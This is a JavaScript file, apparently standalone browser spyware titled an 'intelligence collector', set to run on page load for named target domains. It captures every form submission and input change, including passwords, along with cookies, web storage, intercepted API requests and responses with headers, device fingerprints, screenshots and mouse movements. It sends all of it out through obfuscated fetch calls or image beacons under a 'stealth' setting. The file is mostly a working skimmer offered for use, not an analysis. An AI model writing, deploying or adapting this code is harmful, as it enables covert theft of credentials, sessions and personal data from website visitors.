// agent.js - Ultimate Client-Side Intelligence Collector
;(function() {
    // ####################
    // # CONFIGURATION
    // ####################
    const config = {
        targetDomains: ['realwebsite.com', 'api.realwebsite.com'],
        endpoint: '/collect',
        sessionId: generateSessionId(),
        heartbeatInterval: 45000,
        screenshotInterval: 300000,
        stealthLevel: 9 // 1-10
    };

    // ####################
    // # CORE FUNCTIONALITY
    // ####################
    
    // Generate secure session ID
    function generateSessionId() {
        const buf = new Uint8Array(16);
        crypto.getRandomValues(buf);
        return Array.from(buf, b => b.toString(16).padStart(2, '0')).join('');
    }

    // Encrypt data with lightweight XOR cipher
    function encryptData(data, key=config.sessionId) {
        let output = '';
        for (let i = 0; i < data.length; i++) {
            const charCode = data.charCodeAt(i) ^ key.charCodeAt(i % key.length);
            output += String.fromCharCode(charCode);
        }
        return btoa(output);
    }

    // Stealthy data transmission
    function sendData(type, payload) {
        if (!shouldMonitor()) return;

        const data = {
            t: type,
            d: encryptData(JSON.stringify(payload)),
            s: config.sessionId,
            f: getFingerprint()
        };

        // Multiple exfiltration methods for reliability
        try {
            // Method 1: Fetch with fallback
            if (config.stealthLevel < 8) {
                fetch(config.endpoint, {
                    method: 'POST',
                    body: JSON.stringify(data),
                    keepalive: true
                }).catch(fallbackSend);
            } 
            // Method 2: Image beacon
            else {
                fallbackSend();
            }

            function fallbackSend() {
                new Image().src = `${config.endpoint}?${Object.entries(data)
                    .map(([k,v]) => `${k}=${encodeURIComponent(v)}`)
                    .join('&')}&_=${Date.now()}`;
            }
        } catch(e) {}
    }

    // Domain targeting check
    function shouldMonitor() {
        return config.targetDomains.some(domain => 
            window.location.hostname.endsWith(domain) ||
            document.referrer.includes(domain)
        );
    }

    // ####################
    // # MONITORING MODULES
    // ####################

    // Browser Fingerprinting
    function getFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(0, 0, 100, 50);
            ctx.fillStyle = '#069';
            ctx.fillText('FRP@'+config.sessionId, 2, 15);
            
            return {
                canvas: canvas.toDataURL().substring(22),
                webgl: getWebGLFingerprint(),
                audio: getAudioFingerprint(),
                fonts: getFontList(),
                plugins: Array.from(navigator.plugins).map(p => p.name),
                touch: 'ontouchstart' in window,
                hardware: {
                    cores: navigator.hardwareConcurrency,
                    memory: navigator.deviceMemory
                }
            };
        } catch(e) {
            return {error: e.message};
        }
    }

    // WebGL Fingerprinting
    function getWebGLFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                params: {
                    VERSION: gl.getParameter(gl.VERSION),
                    MAX_TEXTURE_SIZE: gl.getParameter(gl.MAX_TEXTURE_SIZE)
                }
            };
        } catch(e) {
            return null;
        }
    }

    // AudioContext Fingerprinting
    function getAudioFingerprint() {
        try {
            const audioContext = new (window.AudioContext || window.webkitAudioContext)();
            const oscillator = audioContext.createOscillator();
            const analyser = audioContext.createAnalyser();
            const gainNode = audioContext.createGain();
            const scriptProcessor = audioContext.createScriptProcessor(4096, 1, 1);
            
            oscillator.connect(analyser);
            analyser.connect(scriptProcessor);
            scriptProcessor.connect(gainNode);
            gainNode.connect(audioContext.destination);
            
            let fingerprint = '';
            scriptProcessor.onaudioprocess = e => {
                const data = new Float32Array(analyser.frequencyBinCount);
                analyser.getFloatFrequencyData(data);
                fingerprint += data.join(',');
                audioContext.close();
            };
            
            oscillator.start(0);
            return fingerprint.length;
        } catch(e) {
            return null;
        }
    }

    // Installed Fonts Detection
    function getFontList() {
        const fonts = [
            'Arial', 'Arial Black', 'Courier New', 
            'Times New Roman', 'Verdana', 'Helvetica'
        ];
        const available = [];
        
        const div = document.createElement('div');
        div.style.position = 'absolute';
        div.style.left = '-9999px';
        div.style.fontSize = '100px';
        
        const span = document.createElement('span');
        span.textContent = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        
        fonts.forEach(font => {
            const testDiv = div.cloneNode();
            testDiv.style.fontFamily = `'${font}', monospace`;
            testDiv.appendChild(span.cloneNode(true));
            document.body.appendChild(testDiv);
            
            if (testDiv.offsetWidth !== div.offsetWidth) {
                available.push(font);
            }
            
            document.body.removeChild(testDiv);
        });
        
        return available;
    }

    // HTML2Canvas Screenshot Capture
    function captureScreenshot() {
        if (config.stealthLevel > 5) return null;
        
        return new Promise(resolve => {
            import('https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js')
                .then(() => {
                    html2canvas(document.body, {
                        logging: false,
                        scale: 0.5,
                        useCORS: true,
                        allowTaint: true
                    }).then(canvas => {
                        const quality = 0.6;
                        const dataUrl = canvas.toDataURL('image/jpeg', quality);
                        resolve(dataUrl.substring(dataUrl.indexOf(',') + 1));
                    });
                })
                .catch(() => resolve(null));
        });
    }

    // ####################
    // # MONITORING SETUP
    // ####################

    // Form Monitoring
    function monitorForms() {
        document.addEventListener('submit', e => {
            const form = e.target;
            const inputs = Array.from(form.elements).reduce((acc, el) => {
                if (el.name) acc[el.name] = el.value;
                return acc;
            }, {});
            
            sendData('form', {
                action: form.action,
                method: form.method,
                inputs: inputs,
                url: window.location.href
            });
        }, true);
    }

    // Input Monitoring
    function monitorInputs() {
        document.addEventListener('change', e => {
            if (['INPUT', 'TEXTAREA', 'SELECT'].includes(e.target.tagName)) {
                sendData('input', {
                    name: e.target.name || e.target.id,
                    value: e.target.value,
                    type: e.target.type
                });
            }
        });
    }

    // Network Monitoring
    function monitorNetwork() {
        const originalFetch = window.fetch;
        window.fetch = function(...args) {
            const [resource, init = {}] = args;
            const url = typeof resource === 'string' ? resource : resource.url;
            
            if (config.targetDomains.some(d => url.includes(d))) {
                const requestData = {
                    url: url,
                    method: init.method || 'GET',
                    body: init.body,
                    headers: init.headers
                };
                
                sendData('request', requestData);
                
                return originalFetch.apply(this, args)
                    .then(async response => {
                        if (response.ok) {
                            const clone = response.clone();
                            try {
                                const data = await clone.json();
                                sendData('response', {
                                    url: url,
                                    status: response.status,
                                    data: data
                                });
                            } catch(_) {}
                        }
                        return response;
                    });
            }
            
            return originalFetch.apply(this, args);
        };
    }

    // Storage Monitoring
    function monitorStorage() {
        const {localStorage, sessionStorage} = window;
        const storageHandler = {
            set: function(target, prop, value) {
                sendData('storage', {
                    type: target === localStorage ? 'local' : 'session',
                    key: prop,
                    value: value,
                    action: 'set'
                });
                return Reflect.set(target, prop, value);
            },
            deleteProperty: function(target, prop) {
                sendData('storage', {
                    type: target === localStorage ? 'local' : 'session',
                    key: prop,
                    action: 'delete'
                });
                return Reflect.deleteProperty(target, prop);
            }
        };
        
        window.localStorage = new Proxy(localStorage, storageHandler);
        window.sessionStorage = new Proxy(sessionStorage, storageHandler);
    }

    // Periodic Screenshots
    function setupScreenshots() {
        if (config.stealthLevel > 5) return;
        
        setInterval(async () => {
            const screenshot = await captureScreenshot();
            if (screenshot) {
                sendData('screenshot', {
                    data: screenshot,
                    dimensions: {
                        width: window.innerWidth,
                        height: window.innerHeight
                    },
                    url: window.location.href
                });
            }
        }, config.screenshotInterval);
    }

    // Heartbeat Monitoring
    function setupHeartbeat() {
        setInterval(() => {
            sendData('heartbeat', {
                url: window.location.href,
                cookies: document.cookie,
                localStorage: {...localStorage},
                sessionStorage: {...sessionStorage},
                dom: {
                    links: Array.from(document.links).map(l => l.href),
                    forms: Array.from(document.forms).map(f => f.action)
                }
            });
        }, config.heartbeatInterval);
    }

    // ####################
    // # INITIALIZATION
    // ####################

    function initialize() {
        if (!shouldMonitor()) return;
        
        try {
            // Initial data dump
            sendData('init', {
                url: window.location.href,
                referrer: document.referrer,
                cookies: document.cookie,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: `${window.screen.width}x${window.screen.height}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                languages: navigator.languages,
                fingerprint: getFingerprint()
            });

            // Setup monitors
            monitorForms();
            monitorInputs();
            monitorNetwork();
            monitorStorage();
            setupHeartbeat();
            setupScreenshots();

            // Mouse movement tracking
            document.addEventListener('mousemove', throttle(e => {
                sendData('mouse', {
                    x: e.clientX,
                    y: e.clientY,
                    target: e.target?.tagName
                });
            }, 1000));

            // Tab visibility monitoring
            document.addEventListener('visibilitychange', () => {
                sendData('visibility', {
                    state: document.visibilityState,
                    time: Date.now()
                });
            });

        } catch(e) {
            console.debug('Monitoring init error:', e);
        }
    }

    // Throttle function for performance
    function throttle(fn, delay) {
        let last = 0;
        return function(...args) {
            const now = Date.now();
            if (now - last >= delay) {
                last = now;
                fn.apply(this, args);
            }
        };
    }

    // Start when DOM is ready
    if (document.readyState === 'complete') {
        initialize();
    } else {
        window.addEventListener('DOMContentLoaded', initialize);
        window.addEventListener('load', initialize);
    }
})();